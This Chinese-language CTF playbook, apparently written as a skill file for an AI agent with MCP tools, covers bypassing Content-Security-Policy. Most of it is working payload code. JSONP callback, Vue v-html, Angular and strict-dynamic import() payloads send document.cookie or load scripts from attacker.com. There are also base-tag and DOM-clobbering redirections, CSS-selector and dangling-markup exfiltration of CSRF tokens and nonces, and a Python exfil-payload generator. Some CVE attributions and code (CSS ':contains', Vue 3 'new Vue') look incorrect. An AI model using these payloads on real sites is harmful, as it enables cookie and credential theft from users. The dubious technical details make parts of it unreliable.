# CSP 绕过全技术栈

## 场景

目标站点部署了 Content-Security-Policy (CSP) 来限制脚本执行和数据外带。CTF 出题方可能配置了看似严格的 CSP，但存在多种绕过路径。你需要识别 CSP 的细微配置缺陷，并利用其绕过执行 XSS 或数据窃取。

## 输入信号

```
Content-Security-Policy 响应头内容
页面中存在 JSONP 回调端点
引用 CDN 托管的 JS 库 (cdnjs / unpkg / jsdelivr)
检测到 Angular / React / Vue 框架标志
页面存在 base 标签或可注入 base 标签
支持 style-src 或 style 标签注入
CSP nonce / hash 可预测或复用
存在 <!-- --> 注释内容可注入
```

## 1. JSONP Endpoint Abuse

JSONP 端点是 CSP 绕过中最常见的切入点。当 CSP 允许某个可信来源，而该来源又暴露了 JSONP 回调端点时，攻击者可通过回调函数注入任意 JavaScript。

```http
# CSP: script-src 'self' https://trusted-cdn.com;
# 但 trusted-cdn.com 存在 JSONP 端点:
# GET /api/callback?callback=foo   →   foo({...})

# 绕过: 将回调参数改为恶意 payload
# GET /api/callback?callback=alert(1)  →  alert(1)({...})
# 某些实现加了括号或引号，需要转义处理
```

```javascript
// JSONP CSP 绕过通用 payload 生成器
function jsonp_bypass(endpoint, callback_param, payload) {
    // 处理包装: 有些 JSONP 返回 callback({data})，有些返回 callback({data})
    // 需要通过 ) 闭合或注释掉多余部分
    
    // 闭合模式: callback?cb=alert(1) → alert(1)({...})
    // 需要用 // 注释掉多余的括号和内容
    
    // 绕过模式 1: 直接函数调用
    const p1 = `${endpoint}?${callback_param}=${payload}`;
    
    // 绕过模式 2: 箭头函数 + 注释
    const p2 = `${endpoint}?${callback_param}=x=>{${payload}}//`;
    
    // 绕过模式 3: with 语句处理
    const p3 = `${endpoint}?${callback_param}=with(new XMLHttpRequest)open('GET','https://attacker.com/'+document.cookie),send()//`;
    
    return [p1, p2, p3];
}

// 自动搜索 JSONP 端点
async function find_jsonp_endpoints(domain) {
    const common_paths = [
        '/api/jsonp', '/callback', '/jsonp', '/api/callback',
        '/api/user/callback', '/api/data?callback=?',
        '/search?callback=?', '/api?format=jsonp',
        '/rpc?method=jsonp', '/api/v1/callback',
    ];
    const params = ['callback', 'jsonp', 'cb', 'jsoncallback', 'jsonpcallback'];
    
    for (const path of common_paths) {
        for (const param of params) {
            try {
                const url = `${domain}${path}${path.includes('?') ? '&' : '?'}${param}=alert(1)`;
                const r = await fetch(url, {mode: 'no-cors'});
                // 检测响应体是否包含 callback 格式
            } catch(e) {}
        }
    }
}
```

### JSONP Gadget Chain (Real-World CVE)

```javascript
// CVE-2020-7070: jQuery $.ajax JSONP callback 注入
// 当 CSP script-src 包含托管 jQuery 的 CDN 时:
// https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.js

// 利用:
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.js"></script>
<script>
// jQuery 的 $.ajax({dataType:'jsonp'}) 会动态创建 <script>
// 如果 dataType: 'jsonp' 并且 url 的可信域下存在 JSONP 端点
// → jQuery 自动将 callback=xxx 替换为随机函数名并 eval 响应
// → 但在 callback=xxx 中注入 ;alert(1)// 仍可执行
$.ajax({
    url: 'https://trusted.com/api?callback=;alert(1)//',
    dataType: 'jsonp'
});
</script>
```

## 2. CDN Allowlist Bypass — Gadget Hunting

CSP 中 `script-src` 允许 CDN 域时，攻击者可利用该 CDN 上托管的已知库的某个版本中的 script gadget 来执行任意代码。

```javascript
// CDN 域允许列表:
// script-src https://cdnjs.cloudflare.com https://unpkg.com https://cdn.jsdelivr.net;

// Gadget 数据库 (cdngadget.js — 自动检测可用 gadget):
const CDN_GADGETS = {
    'cdnjs.cloudflare.com': [
        // Prototype.js 1.7.x: $$() 方法处理
        {path: '/ajax/libs/prototype/1.7.3/prototype.js', gadget: '$$'},
        // Mootools: $$() 选择器
        {path: '/ajax/libs/mootools/1.6.0/mootools-core.js', gadget: '$$'},
        // YUI: YUI().use() 动态加载
        {path: '/ajax/libs/yui/3.18.1/yui-min.js', gadget: 'YUI'},
        // AngularJS 1.x: ng-csp bypass
        {path: '/ajax/libs/angular.js/1.8.3/angular.min.js', gadget: 'ng-csp'},
    ],
    'unpkg.com': [
        // Vue.js: v-html directive
        {path: '/vue@3.4.0/dist/vue.global.prod.js', gadget: 'v-html'},
        // Preact: dangerouslySetInnerHTML
        {path: '/preact@10.19.0/dist/preact.min.js', gadget: 'innerHTML'},
    ],
    'cdn.jsdelivr.net': [
        // Alpine.js: x-init directive
        {path: '/npm/alpinejs@3.13.0/dist/cdn.min.js', gadget: 'x-init'},
        // htmx: hx-trigger attribute
        {path: '/npm/htmx.org@1.9.10/dist/htmx.min.js', gadget: 'hx-trigger'},
    ]
};

// Gadget 利用示例: AngularJS 1.x CSP bypass
// CSP: script-src 'self' https://cdnjs.cloudflare.com;
// → 引入 angular.min.js 并利用 ng-csp 模式执行
```

```html
<!-- AngularJS 1.x CSP Bypass (Classic, CVE-2020-7675+) -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
<div ng-app ng-csp>
  <div ng-click="$event.view.alert(1)">Click me</div>
  <!-- 或自动执行: -->
  <script>
    angular.element(document).ready(function() {
      angular.module('myapp', []).run(function($sce) {
        // 通过 $sce.trustAsHtml 绕过 CSP 注入任意 HTML
      });
    });
  </script>
</div>

<!-- Vue.js CSP bypass via v-html -->
<script src="https://unpkg.com/vue@3.4.0/dist/vue.global.prod.js"></script>
<div id="app">
  <div v-html="payload"></div>
</div>
<script>
  new Vue({
    el: '#app',
    data: { payload: '<img src=x onerror="fetch(\'https://attacker.com/\'+document.cookie)">' }
  });
</script>
```

## 3. Framework-Specific Bypass

### Angular

```html
<!-- Angular 2+ CSP bypass via DomSanitizer bypass -->
<!-- 场景: CSP strict-dynamic 但 Angular 应用存在 sanitization bypass -->

<!-- Sandbox escape via styles in Angular 15+ -->
<div [style.background]="'url(javascript:fetch(\'https://attacker.com/\'+document.cookie))'">
  Test
</div>

<!-- Angular 14- SSR / hydration XSS 利用 -->
<!-- CVE-2023-40577: Angular CDK drag-drop 通过 prototype pollution → RCE -->
```

### React

```javascript
// React 应用中，dangerouslySetInnerHTML 是最直接的 CSP 绕过目标
// 即使 CSP script-src 限制严格，但 React 是客户端渲染
// 可用 dangerouslySetInnerHTML 注入 <img onerror>

// 更高级: React Hydration Mismatch Attack
// CVE-2022-32213: React SSR hydration 中，
// 服务端渲染的 HTML 与客户端期望差异 → 浏览器重新解析
// 攻击者注入额外的 HTML 标签使 hydration 过程重新生成节点

// React 18: useId() 冲突 → class 名可预测 → CSS 注入
```

### Vue

```javascript
// Vue 2/3: v-html directive (前文已述)
// Vue 3: v-bind 原型污染 (CVE-2023-32233)
//   Vue 3 的 compile 函数中，通过 prototype 键覆盖白名单属性
//   → 实现 {__proto__: {toString: ...}} 来触发任意调用

// Vue 2: v-bind 服务端渲染中，class 绑定允许数组语法
// → 注入 [{toString: function() { /* 任意 JS */ }}] 导致 XSS
```

## 4. DOM Clobbering 注入脚本源

当 CSP 的 `script-src` 通过 nonce 或 hash 控制，但页面存在 HTML 注入点时，DOM clobbering 可影响页面逻辑，进而绕过 CSP。

```javascript
// 场景: CSP: script-src 'self'; 但页面代码中有:
// const config = document.getElementById('config').textContent;
// const scriptSrc = JSON.parse(config).scriptSource;

// DOM Clobber: 创建伪造的 config 元素
// HTML 注入: <a id="config" href="data:text/javascript,alert(1)">x</a>
// 但 href 返回的是 URL 对象，不是纯字符串...

// 更精确: 利用 <textarea> + <a> 组合
// HTML 注入:
// <a id="config">{"scriptSource": "data:text/javascript,alert(1)"}</a>

// 高级 DOM clobber: 通过 name 属性影响 document 集合
// window.x 可被 <a name="x"> 覆盖
// <form name="config"> → document.config → form element
```

```html
<!-- DOM Clobbering → script loading bypass -->
<!-- 目标 JS 代码: -->
<!-- if (window.config && window.config.cdn) {
       var s = document.createElement('script');
       s.src = window.config.cdn + '/app.js';
       document.head.appendChild(s);
     } -->

<!-- 注入: -->
<a id="config" href="x"></a>
<!-- window.config 变成 HTMLAnchorElement -->
<!-- window.config.cdn → 试图访问 anchor 的 cdn 属性 → undefined -->

<!-- 但如果使用: -->
<form id="config">
  <input name="cdn" value="https://attacker.com">
</form>
<!-- window.config → HTMLFormElement -->
<!-- window.config.cdn → 且由于 form 元素的命名访问特性
     → 返回 <input name="cdn"> 的 value -->
<!-- 最终 script.src = "https://attacker.com/app.js" → 绕过 CSP! -->
```

## 5. Base Tag Injection

当 CSP `script-src` 使用了 `'self'` 但页面允许注入 `<base>` 标签时，可将所有相对路径脚本重定向到攻击者服务器。

```html
<!-- 场景: CSP: script-src 'self'; -->
<!-- 页面加载 /js/app.js (相对路径) -->

<!-- 注入: -->
<base href="https://attacker.com/">
<!-- 之后所有 /js/app.js → https://attacker.com/js/app.js -->
<!-- 但攻击者服务器在该路径放置恶意 JS → CSP 'self' 信任原来的域，不是新域... -->

<!-- 等等! base 标签只影响相对路径，不影响绝对路径 -->
<!-- 如果页面使用: <script src="/js/jquery.js"></script> -->
<!-- 浏览器解析为: https://original.com/js/jquery.js → 不受 base 影响 -->

<!-- 但如果页面使用: <script src="js/jquery.js"></script> (无前导 /) -->
<!-- base 影响后 → https://attacker.com/js/jquery.js → CSP check: -->
<!-- CSP script-src 'self' → 'self' 解析为页面的 origin → 拒绝! -->

<!-- 实际绕过需要 CSP 允许特定的 CDN 域，而 base 指向的子路径在该域上 -->
```

```html
<!-- 实用场景: CSP + base + 路径劫持 -->
<!-- CSP: script-src https://cdn.example.com https://other-cdn.com; -->
<!-- 页面中: <script src="//cdn.example.com/lib.js"></script> -->

<!-- 注入 base 到 https://other-cdn.com/evil/ -->
<base href="https://other-cdn.com/evil/">
<!-- 但协议相关 URL (//cdn.example.com) 不受 base 影响 -->

<!-- 所以: 需要找使用完全相对路径的 script 标签来利用 -->
```

## 6. Scriptless Attacks — CSS Injection Exfiltration

即使 CSP 完全禁止 JavaScript (`script-src 'none'`)，CSS 注入仍可窃取数据。

```css
/* CSS 注入 keylogger: 利用 @font-face + Unicode-range */
/* 当输入框的值反映在 CSS 选择器中时 */

/* 场景: <style> 标签注入，或 style-src 'unsafe-inline' */

/* Attribute value selector — 字符级窃取 */
input[value^="a"] { background: url(https://attacker.com/char?a); }
input[value^="b"] { background: url(https://attacker.com/char?b); }
input[value^="c"] { background: url(https://attacker.com/char?c); }
/* ... 26个字母 + 数字 + 特殊字符 ... */

/* 针对 CSRF token 的 CSS 注入 */
input[name="csrf_token"][value^="a"] { background: url(https://attacker.com/token/a); }
```

```css
/* Dangling Markup Injection — 在 CSS 上下文中窃取后续 HTML */
/* 场景: 注入点出现在 <style> 之前，可在 style 标签内闭合后窃取 */

/* 注入: */
</style>
<!-- 之后的 HTML 直到遇到 </ --> 都被视为 CSS → 不渲染也不执行
<!-- 但可利用 CSS 的 background: url() 将后续内容发送到攻击者服务器: -->

/* 真正的 Dangling Markup: 利用 <form> 动作 */
/* 注入: */
<form action="https://attacker.com/steal" method="POST" id="exfil">
<input name="secret" value="
<!-- 后续 HTML 直到遇到 " 都被包含在 input value 中作为隐藏数据 -->
<!-- 然后表单自动提交 → 窃取内容 -->
```

```css
/* Scroll-to-text-fragment CSS injection */
/* CSP: style-src 'self'; 但可注入 CSS 时: */
:target::before {
    content: url(https://attacker.com/visited?q=);
}
/* 结合 #:~:text= 实现访问窃取 */
```

### CSS Injection via Scrollbar Customization

```css
/* CSS injection + scrollbar 实现可视字符窃取 */
/* 条件: 页面包含内联 <style> 注入点 */
/* 利用 CSS selector 匹配特定文本内容 */

/* CSS 注入 + @import 实现递归加载 */
/* CSP style-src: 允许 'unsafe-inline' 时可用 */

/* 利用 CSS scroll-driven animations (CSS 2023+) */
@keyframes leak {
    to { background: url(https://attacker.com/leak); }
}
span:has(+ span:has(+ span:contains("a"))) {
    animation: leak 1s;
}
/* 检测包含特定三重字符组合的 span */
```

## 7. strict-dynamic Bypass

`strict-dynamic` 是 CSP Level 3 的安全机制，但存在已知绕过方案。

```http
# CSP: script-src 'strict-dynamic' 'nonce-abc123' 'sha256-xxx'
# strict-dynamic 的含义: 只信任被 nonce/hash 标记的脚本，
# 以及被它们动态加载的脚本（继承信任）

# 绕过 1: 预加载扫描器 (preload scanner) 差异
# 浏览器预加载扫描器在 HTML 解析前就发现 <script> 标签
# 但如果 nonce 是通过 JS 动态写入的，预加载扫描器可能跳过
# → 但严格来说这不算是 strict-dynamic 的绕过

# 绕过 2: import() 动态导入
# strict-dynamic 允许被信任的脚本执行 import() → 加载任意 URL
# 如果攻击者控制了被信任脚本的输出:
<script nonce="abc123">
// 攻击者注入点在这里
import('https://attacker.com/evil.js');
</script>

# 绕过 3: Worker 创建
# strict-dynamic 允许被信任脚本创建 Worker/SharedWorker
<script nonce="abc123">
new Worker('https://attacker.com/worker.js');
new SharedWorker('https://attacker.com/shared-worker.js');
</script>
```

```javascript
// strict-dynamic + import() bypass
// 当 CSP 包含 'strict-dynamic' 时:
// 1. 所有动态加载的 script 标签 (appendChild) 继承信任
// 2. import() 调用也继承信任
// 3. new Worker() 也继承信任

// 场景: 页面包含:
// <script nonce="xxx" src="/api/config.js"></script>
// config.js: var API_KEY = "staging-key";

// 如果我们可以控制 config.js 的内容 (通过 JSONP) → 可以执行任意代码
// 如果 config.js 有验证: JSONP callback → JSON.parse → XSS via prototype

// 更实际的场景:
// 登录后页面加载用户头像: <script nonce="xxx"> var avatar = "{{user_avatar_url}}"; </script>
// 如果用户可控头像 URL 且可注入:
// avatar = "x"; import('https://attacker.com/evil.js');//
// → strict-dynamic 信任该 import → 任意 JS 执行!
```

## 8. Nonce / Hash Bypass 特定技术

### Nonce Reuse

```javascript
// 如果 nonce 在 session 中不改变 → 攻击者可通过 XSS 或其他方式窃取 nonce
// 或者通过 CSS injection 读出 nonce:
// script[nonce^="a"] { background: url(https://attacker.com/nonce/a); }

// 非 HTTP-only cookie 存储的 nonce
// document.cookie → document.querySelector('script[nonce]') → 窃取
```

### Hash Collision / Known Hashes

```http
# CSP: script-src 'sha256-abc123...'
# 如果只 hash 了特定脚本，但允许了另一个已知 hash 的脚本:
# https://github.com/csp-hasher/common-hashes.txt

# 已知 hash 脚本:
# - Google Analytics (sha256-xxxxxxxx)
# - reCAPTCHA
# - Facebook SDK
# 如果这些域在 CSP 中没被独立限制，但 hash 被允许 → 可加载这些 SDK
# → 用它们的 API 来执行代码?
```

## 9. CSP Evaluator & 自动化工具

```python
# csp_evaluator.py — 自动分析 CSP 并生成绕过方案
import json, re

CSP_BYPASS_PATTERNS = {
    'script-src': {
        'unsafe-inline': '直接注入 <script> 标签',
        'unsafe-eval': '使用 eval() / setTimeout("string") 执行',
        'wildcard_cdn': 'CDN 域存在可用 gadget',
        'http_protocol': 'HTTP 域上的 MITM',
        'nonce_short': 'nonce 长度不足 32 位可爆破',
        'strict_dynamic_import': '判断 import() 是否可利用',
        'jsonp_gadget': '可信域存在 JSONP 端点',
    },
    'style-src': {
        'unsafe-inline': 'CSS injection → 数据窃取',
        'wildcard': '* 允许所有域加载样式 → CSS 数据注入可能',
    },
    'default-src': {
        'none': 'CSP 未逐一指定 → 各指令继承 default-src',
        'self_no_script': '只信任自身域 → 需 base 或 DOM clobbering',
    }
}

def analyze_csp(csp_header):
    """分析 CSP 策略并生成绕过建议"""
    findings = []
    directives = {}
    
    for part in csp_header.split(';'):
        part = part.strip()
        tokens = part.split()
        if tokens:
            directives[tokens[0]] = tokens[1:]
    
    # script-src 分析
    scripts = directives.get('script-src') or directives.get('default-src', [])
    if "'unsafe-inline'" in scripts:
        findings.append({'type': 'script-src', 'severity': 'critical',
                         'note': CSP_BYPASS_PATTERNS['script-src']['unsafe-inline']})
    if "'unsafe-eval'" in scripts:
        findings.append({'type': 'script-src', 'severity': 'high',
                         'note': CSP_BYPASS_PATTERNS['script-src']['unsafe-eval']})
    
    # 检查 CDN 白名单
    for src in scripts:
        for cdn in ['cdnjs.cloudflare.com', 'unpkg.com', 'cdn.jsdelivr.net',
                     'ajax.googleapis.com', 'code.jquery.com']:
            if cdn in src:
                findings.append({'type': 'script-src', 'severity': 'high',
                                 'note': f'CDN allowlisted: {cdn}'})
                # 自动检索该 CDN 上的 gadget
                break
    
    return findings


# CSP bypass 自动生成器
def generate_csp_bypass_payload(csp: str, xss_context: str, exfil_url: str) -> list:
    """根据 CSP 生成可用的绕过 payload"""
    payloads = []
    
    if "'unsafe-inline'" in csp:
        payloads.append(f"<script>fetch('{exfil_url}/?'+document.cookie)</script>")
    
    if "'strict-dynamic'" in csp:
        # 寻找受信任脚本上下文中的注入点
        payloads.append(f"');import('{exfil_url}/caat?import=1');//")
    
    # CDN 检查
    for cdn in ['cdnjs.cloudflare.com', 'unpkg.com']:
        if cdn in csp:
            payloads.append(f'<script src="https://{cdn}/angular.js/1.8.3/angular.min.js">')
    
    return payloads
```

## 攻击链

```
JSONP 端点 + 回调注入 → CSP script-src 绕过 → 任意 JS 执行
CDN 白名单 + 框架 gadget → 框架函数执行 → DOM 操作 → XSS
CSP strict-dynamic + import() 注入 → 动态加载恶意模块
CSP nonce 复用 → 非一次性 nonce → 非信任脚本也通过
CSP hash 白名单 + 已知 hash 脚本库 → 加载可控脚本
Base tag + 相对路径脚本 → 脚本重定向 → XSS
CSP + DOM clobbering → 覆盖 config 对象 → 动态加载攻击者脚本
CSP script-src 'none' + CSS injection → CSS keylogger → 凭据窃取
CSP script-src 'none' + Dangling Markup → 表单注入 → 后续 HTML 窃取
WebWorker + strict-dynamic → worker 中加载任意外部脚本
```

## 证据

记录: 完整 CSP 头、注入点 (JSONP/CDN/DOM 注入/base)、使用的 gadget 名称/版本、绕过 payload、外带通道、获取到的敏感数据。附录 CSP evaluator 输出。

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| CSP 策略探测 | `http_probe` | HTTP GET 获取 CSP 响应头 |
| CSP 知识检索 | `kb_router` | 按 CSP 指令搜索已知绕过技术 |
| 技术文件阅读 | `kb_read_file` | 读取具体 CSP 绕过技术的代码示例 |
| CDN gadget 信息 | `run_ctf_tool` | 运行 dirsearch/jwt_tool 等辅助工具探测端点 |
